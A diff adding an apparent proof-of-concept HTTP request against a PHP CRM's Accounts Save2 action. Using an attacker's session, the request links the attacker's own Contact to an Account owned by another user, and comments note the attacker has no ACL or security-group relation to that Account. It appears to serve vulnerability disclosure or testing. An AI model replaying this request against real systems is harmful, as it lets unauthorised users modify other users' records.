@@ -1,0 +1,10 @@
+POST /index.php?module=Accounts&action=Save2 HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker session>
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:33116/index.php?module=Accounts&action=DetailView&record=8384e206-4b36-4777-97c0-4a250db90fed
+
+record=8384e206-4b36-4777-97c0-4a250db90fed&subpanel_field_name=contacts&subpanel_id=a5e3fa52-6c22-4769-a192-4432afaa3f08&subpanel_module_name=Contacts&refresh_page=1
+
+# Attacker A (mod_7165a6f5) owns Contact a5e3fa52-6c22-4769-a192-4432afaa3f08 but has
+# NO ownership/ACL/Security-Group relation to Account 8384e206-4b36-4777-97c0-4a250db90fed (owned by V).
